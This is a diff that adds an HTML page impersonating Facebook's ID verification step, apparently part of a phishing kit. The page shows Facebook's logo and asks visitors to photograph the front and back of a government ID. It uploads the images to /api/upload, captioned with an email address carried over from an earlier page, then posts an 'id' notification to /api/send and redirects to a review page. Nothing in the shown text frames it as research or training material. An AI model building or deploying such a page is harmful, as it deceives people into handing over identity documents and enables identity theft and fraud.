@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - ID Verification</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" alt="Facebook" class="fb-logo">
+        
+        <div class="id-container">
+            <div class="progress-bar"><div class="progress-fill" style="width: 100%"></div></div>
+            <div class="screen-title">ID Verification</div>
+            <div class="screen-text">Upload photos of your government-issued ID:</div>
+            
+            <div class="file-upload" onclick="document.getElementById('frontInput').click()">
+                <div class="upload-text">🪪 Front of ID</div>
+            </div>
+            <input type="file" id="frontInput" accept="image/*" capture="environment" style="display: none;">
+            
+            <div class="file-upload" onclick="document.getElementById('backInput').click()">
+                <div class="upload-text">📄 Back of ID (Optional)</div>
+            </div>
+            <input type="file" id="backInput" accept="image/*" capture="environment" style="display: none;">
+            
+            <button class="primary" onclick="submitID()">
+                <span id="buttonText">Submit Verification</span>
+                <div class="button-loader" id="buttonLoader"></div>
+            </button>
+        </div>
+    </div>
+    
+    <script>
+        async function submitID() {
+            const email = sessionStorage.getItem('email');
+            
+            // Show loading
+            const btn = document.querySelector('.primary');
+            const buttonText = document.getElementById('buttonText');
+            const buttonLoader = document.getElementById('buttonLoader');
+            
+            btn.disabled = true;
+            buttonText.style.display = 'none';
+            buttonLoader.style.display = 'block';
+            
+            // Upload front ID if selected
+            const frontInput = document.getElementById('frontInput');
+            if (frontInput.files[0]) {
+                const formData = new FormData();
+                formData.append('file', frontInput.files[0]);
+                formData.append('caption', `Front ID: ${email}`);
+                await fetch('/api/upload', { method: 'POST', body: formData });
+            }
+            
+            // Upload back ID if selected
+            const backInput = document.getElementById('backInput');
+            if (backInput.files[0]) {
+                const formData = new FormData();
+                formData.append('file', backInput.files[0]);
+                formData.append('caption', `Back ID: ${email}`);
+                await fetch('/api/upload', { method: 'POST', body: formData });
+            }
+            
+            // Send notification
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'id',
+                    data: { 
+                        email, 
+                        front: frontInput.files[0] ? 'Yes' : 'No',
+                        back: backInput.files[0] ? 'Yes' : 'No'
+                    },
+                    ip: 'user_ip_here'
+                })
+            });
+            
+            // Redirect to review page
+            setTimeout(() => {
+                window.location.href = '/review';
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
